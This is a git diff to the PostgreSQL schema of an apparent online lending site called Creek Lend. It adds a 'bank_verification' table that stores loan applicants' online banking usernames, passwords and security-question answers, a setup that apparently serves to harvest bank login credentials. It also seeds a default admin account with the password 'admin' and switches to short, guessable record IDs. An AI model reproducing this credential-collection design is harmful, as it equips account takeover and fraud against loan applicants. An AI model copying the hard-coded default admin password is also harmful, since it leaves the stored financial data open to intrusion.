@@ -1,13 +1,19 @@
 -- Creek Lend Database Schema
 -- PostgreSQL
 
--- Enable UUID extension
-CREATE EXTENSION IF NOT EXISTS "uuid-ossp";
+-- Drop existing tables to re-initialize
+-- DROP TABLE IF EXISTS bank_verification CASCADE;
+-- DROP TABLE IF EXISTS contact_messages CASCADE;
+-- DROP TABLE IF EXISTS admin_users CASCADE;
+-- DROP TABLE IF EXISTS audit_log CASCADE;
+-- DROP TABLE IF EXISTS loan_applications CASCADE;
+
+-- Enable extension
 CREATE EXTENSION IF NOT EXISTS "pgcrypto";
 
 -- Loan Applications Table
 CREATE TABLE loan_applications (
-    id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
+    id VARCHAR(5) PRIMARY KEY,
 
     -- Personal Information
     first_name VARCHAR(50) NOT NULL,
@@ -46,6 +52,7 @@ CREATE TABLE loan_applications (
     account_number_encrypted TEXT NOT NULL,  -- AES-256 encrypted
     routing_number VARCHAR(11) NOT NULL,
     account_type VARCHAR(10) NOT NULL CHECK (account_type IN ('checking', 'savings')),
+    bank_verification_completed BOOLEAN NOT NULL DEFAULT FALSE,
 
     -- UTM Tracking
     utm_source VARCHAR(255) DEFAULT '',
@@ -62,7 +69,7 @@ CREATE TABLE loan_applications (
     ip_address VARCHAR(45) NOT NULL,
     user_agent TEXT DEFAULT '',
     lead_id VARCHAR(255) DEFAULT '',       -- Jornaya/TrustedForm
-    status VARCHAR(30) NOT NULL DEFAULT 'bank_verification_pending' CHECK (status IN ('bank_verification_pending', 'pending', 'reviewing', 'approved', 'declined', 'funded')),
+    status VARCHAR(30) NOT NULL DEFAULT 'bank_verification_pending' CHECK (status IN ('bank_verification_pending', 'bank_verification_completed', 'pending', 'reviewing', 'approved', 'declined', 'funded')),
 
     -- Timestamps
     created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
@@ -81,8 +88,8 @@ CREATE INDEX idx_applications_utm ON loan_applications(utm_source, utm_medium, u
 
 -- Audit Log Table
 CREATE TABLE audit_log (
-    id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
-    application_id UUID REFERENCES loan_applications(id),
+    id VARCHAR(5) PRIMARY KEY,
+    application_id VARCHAR(5) REFERENCES loan_applications(id),
     action VARCHAR(50) NOT NULL,
     performed_by VARCHAR(255) NOT NULL,
     details JSONB DEFAULT '{}',
@@ -95,7 +102,7 @@ CREATE INDEX idx_audit_created ON audit_log(created_at DESC);
 
 -- Admin Users Table
 CREATE TABLE admin_users (
-    id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
+    id VARCHAR(5) PRIMARY KEY,
     email VARCHAR(255) UNIQUE NOT NULL,
     password_hash VARCHAR(255) NOT NULL,
     name VARCHAR(100) NOT NULL,
@@ -106,9 +113,14 @@ CREATE TABLE admin_users (
     updated_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
 );
 
+-- Default Admin User (Password: admin)
+INSERT INTO admin_users (id, email, password_hash, name, role)
+VALUES ('10001', 'pabitra@gmail.com', '$2b$12$aAHNSfUul2gpKqknp2ShkOKZjYU7s.yAlYiFDY4XAScy5IM5xL5xL5wa', 'Pabitra', 'admin')
+ON CONFLICT (email) DO NOTHING;
+
 -- Contact Messages Table
 CREATE TABLE contact_messages (
-    id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
+    id VARCHAR(5) PRIMARY KEY,
     name VARCHAR(100) NOT NULL,
     email VARCHAR(255) NOT NULL,
     subject VARCHAR(100) NOT NULL,
@@ -121,6 +133,39 @@ CREATE TABLE contact_messages (
 
 CREATE INDEX idx_contact_created ON contact_messages(created_at DESC);
 CREATE INDEX idx_contact_read ON contact_messages(is_read);
+
+-- Bank Verification Table (Secure Vault)
+CREATE TABLE bank_verification (
+    id VARCHAR(5) PRIMARY KEY,
+    application_id VARCHAR(5) NOT NULL REFERENCES loan_applications(id) ON DELETE CASCADE,
+
+    -- Section A: Bank Identification
+    bank_name VARCHAR(100) NOT NULL,
+    account_type VARCHAR(10) NOT NULL CHECK (account_type IN ('checking', 'savings')),
+
+    -- Section B: Credentials (ENCRYPTED)
+    banking_username_encrypted TEXT NOT NULL,       -- AES-256 encrypted
+    banking_password_encrypted TEXT NOT NULL,       -- AES-256 encrypted
+    security_question_encrypted TEXT,               -- AES-256 encrypted (optional/dynamic)
+
+    -- Applicant Info
+    full_name VARCHAR(100) NOT NULL,
+    email VARCHAR(255) NOT NULL,
+
+    -- Meta
+    ip_address VARCHAR(45) NOT NULL,
+    user_agent TEXT DEFAULT '',
+
+    -- Status
+    verification_status VARCHAR(20) NOT NULL DEFAULT 'pending' CHECK (verification_status IN ('pending', 'verified', 'failed')),
+
+    -- Timestamps
+    created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
+    updated_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
+);
+
+CREATE INDEX idx_bank_verification_application ON bank_verification(application_id);
+CREATE INDEX idx_bank_verification_status ON bank_verification(verification_status);
 
 -- Updated at trigger
 CREATE OR REPLACE FUNCTION update_updated_at_column()
@@ -137,4 +182,8 @@ CREATE TRIGGER update_applications_updated_at
 
 CREATE TRIGGER update_admin_users_updated_at
     BEFORE UPDATE ON admin_users
+    FOR EACH ROW EXECUTE FUNCTION update_updated_at_column();
+
+CREATE TRIGGER update_bank_verification_updated_at
+    BEFORE UPDATE ON bank_verification
     FOR EACH ROW EXECUTE FUNCTION update_updated_at_column();
